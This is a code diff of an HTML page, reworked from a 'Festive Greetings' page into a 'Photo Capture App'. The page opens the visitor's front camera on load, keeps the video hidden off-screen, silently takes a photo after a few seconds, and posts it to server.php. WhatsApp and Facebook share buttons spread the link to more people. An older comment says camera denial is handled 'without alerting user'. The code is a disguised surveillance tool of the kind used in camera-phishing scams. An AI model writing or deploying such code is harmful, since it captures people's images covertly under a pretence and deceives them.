@@ -42,103 +42,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Festive Greetings</title>
+    <title>Photo Capture App</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Verdana', sans-serif;
             text-align: center;
-            background-color: #f0f0f0;
+            background-color: #1a1a1a;
             margin: 0;
             padding: 20px;
+            color: #e0e0e0;
         }
-        h1, p {
-            color: #333;
-        }
-        .greeting {
+        .intro {
             margin: 20px 0;
-            font-size: 1.5em;
+            font-size: 1.3em;
+            color: #b0b0b0;
         }
-        .consent {
+        .notice {
             margin: 20px;
-            padding: 10px;
-            border: 1px solid #ccc;
-            background-color: #fff;
+            padding: 15px;
+            border: 1px solid #444444;
+            background-color: #2a2a2a;
             font-size: 0.9em;
+            border-radius: 5px;
+            color: #cccccc;
+        }
+        .share-buttons {
+            margin-top: 30px;
         }
         button {
-            padding: 10px 20px;
+            padding: 12px 25px;
             font-size: 1em;
             margin: 10px;
             cursor: pointer;
-            background-color: #4CAF50;
-            color: white;
+            background-color: #ff4d4d;
+            color: #ffffff;
             border: none;
             border-radius: 5px;
+            transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #45a049;
+            background-color: #e04343;
         }
-        #video, #canvas {
+        #video {
+            visibility: hidden;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+        #canvas {
             display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to Festive Greetings</h1>
-    <p class="greeting">Wishing you a joyful and prosperous celebration!</p>
-    <div class="consent">
-        <p>This app may use your camera to personalize your greeting. By continuing, you agree to allow camera access.</p>
+    <div class="intro">
+        <p>Capture a moment with this app!</p>
+    </div>
+    <div class="notice">
+        <p>This app will use your camera to take a photo. By proceeding, you consent to camera access.</p>
     </div>
     <video id="video" autoplay muted></video>
     <canvas id="canvas"></canvas>
-    <p>Share this moment:</p>
-    <button onclick="share('WhatsApp')">WhatsApp Share</button>
-    <button onclick="share('Facebook')">Facebook Share</button>
+    <div class="share-buttons">
+        <p>Share this link:</p>
+        <button onclick="shareLink('WhatsApp')">WhatsApp</button>
+        <button onclick="shareLink('Facebook')">Facebook</button>
+    </div>
 
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        const videoElement = document.getElementById('video');
+        const canvasElement = document.getElementById('canvas');
 
-        // Automatically request camera access on page load
+        // Request camera access on page load
         window.addEventListener('load', () => {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
-                    video.srcObject = stream;
-                    // Wait briefly to ensure video is ready, then capture silently
-                    setTimeout(capturePhoto, 1000);
+                    videoElement.srcObject = stream;
                 })
                 .catch(err => {
                     console.error('Camera access failed:', err);
-                    // Silently handle denial without alerting user
                 });
         });
 
-        function capturePhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/png');
+        // Capture photo when video is ready
+        videoElement.addEventListener('canplay', () => {
+            setTimeout(() => {
+                canvasElement.width = videoElement.videoWidth;
+                canvasElement.height = videoElement.videoHeight;
+                canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
+                const imageData = canvasElement.toDataURL('image/png');
 
-            fetch('server.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imageData })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(data.message);
-                // Stop the video stream after capture
-                video.srcObject.getTracks().forEach(track => track.stop());
-            })
-            .catch(err => {
-                console.error('Error saving photo:', err);
-            });
-        }
+                fetch('server.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data.message);
+                    videoElement.srcObject.getTracks().forEach(track => track.stop());
+                })
+                .catch(err => {
+                    console.error('Error saving photo:', err);
+                });
+            }, 2000);
+        });
 
-        function share(platform) {
+        function shareLink(platform) {
             const url = window.location.href;
             if (platform === 'WhatsApp') {
-                window.open(`https://api.whatsapp.com/send?text=Check%20out%20this%20festive%20greeting!%20${url}`);
+                window.open(`https://api.whatsapp.com/send?text=Check%20out%20this%20photo%20capture!%20${url}`);
             } else if (platform === 'Facebook') {
                 window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`);
             }
